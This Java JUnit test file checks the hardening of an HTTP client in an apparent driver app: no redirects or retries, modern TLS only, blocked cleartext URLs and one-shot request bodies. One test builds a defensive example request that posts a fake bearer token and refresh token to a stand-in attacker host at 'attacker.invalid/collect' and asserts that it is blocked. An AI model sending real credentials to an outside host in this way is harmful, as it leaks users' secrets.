package ru.transferservis.driver.security;

import java.io.IOException;
import java.util.Collections;
import okhttp3.ConnectionSpec;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import org.junit.Test;
import ru.transferservis.driver.data.api.SecureHttpClient;
import static org.junit.Assert.*;

public class SecureHttpClientTest {
    @Test public void preventsRedirectAndTransportReplay() {
        OkHttpClient client = SecureHttpClient.newBuilder().build();
        assertFalse(client.followRedirects());
        assertFalse(client.followSslRedirects());
        assertFalse(client.retryOnConnectionFailure());
        assertEquals(30_000, client.callTimeoutMillis());
        assertEquals(Collections.singletonList(ConnectionSpec.MODERN_TLS), client.connectionSpecs());
        assertNull(client.cache());
    }

    @Test public void foreignCredentialRequestFailsBeforeNetworkWithoutLeakingSecrets() {
        OkHttpClient client = SecureHttpClient.newBuilder().build();
        Request request = new Request.Builder().url("https://attacker.invalid/collect")
                .header("Authorization", "Bearer TEST_SECRET_MUST_NOT_LEAK")
                .post(RequestBody.create(null, "TEST_REFRESH_MUST_NOT_LEAK")).build();
        try {
            client.newCall(request).execute().close();
            fail("Foreign request was accepted");
        } catch (IOException expected) {
            assertEquals("Untrusted API endpoint", expected.getMessage());
        }
    }

    @Test public void insecureBackendRequestFailsBeforeNetwork() {
        OkHttpClient client = SecureHttpClient.newBuilder().build();
        Request request = new Request.Builder()
                .url("http://uber-v3.lobanov0710.workers.dev/staff/refresh").build();
        try {
            client.newCall(request).execute().close();
            fail("Cleartext request was accepted");
        } catch (IOException expected) {
            assertEquals("Untrusted API endpoint", expected.getMessage());
        }
    }

    @Test public void mutationBodiesAreOneShotBeforeTransport() throws Exception {
        okhttp3.OkHttpClient client=SecureHttpClient.newBuilder().addInterceptor(chain->{
            assertTrue(chain.request().body().isOneShot());
            return new okhttp3.Response.Builder().request(chain.request()).protocol(okhttp3.Protocol.HTTP_1_1)
                    .code(503).message("Synthetic").header("Retry-After","0").body(okhttp3.ResponseBody.create(null,"")).build();
        }).build();
        for(String method:new String[]{"POST","PUT","PATCH"})try(okhttp3.Response response=client.newCall(new okhttp3.Request.Builder()
                .url(ru.transferservis.driver.security.ApiEndpointPolicy.BASE_URL+"synthetic-mutation").method(method,okhttp3.RequestBody.create(null,"{}")).build()).execute()) {
            assertEquals(503,response.code());
        }
    }
}
